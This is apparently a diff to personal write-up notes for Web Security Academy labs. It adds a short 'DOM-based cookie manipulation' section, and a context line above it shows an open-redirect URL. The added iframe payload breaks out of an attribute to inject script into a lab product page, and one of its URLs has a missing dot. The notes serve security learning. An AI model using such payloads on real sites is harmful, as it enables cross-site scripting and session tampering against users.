@@ -77,3 +77,9 @@
 
 https://acaa1f4e1f5e9aa7c0c6e265002f004c.web-security-academy.net/post?postId=4&url=https://exploit-ac4f1f6d1f429a0dc0e4e2eb018e0096.web-security-academy.net/ 
 ```
+
+### DOM-based cookie manipulation
+* Payload
+```html
+<iframe src="https://acb61f151e1962a8c0e21111007b00ff.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://acb61f151e1962a8c0e21111007b00ffweb-security-academy.net';window.x=1;"> 
+```
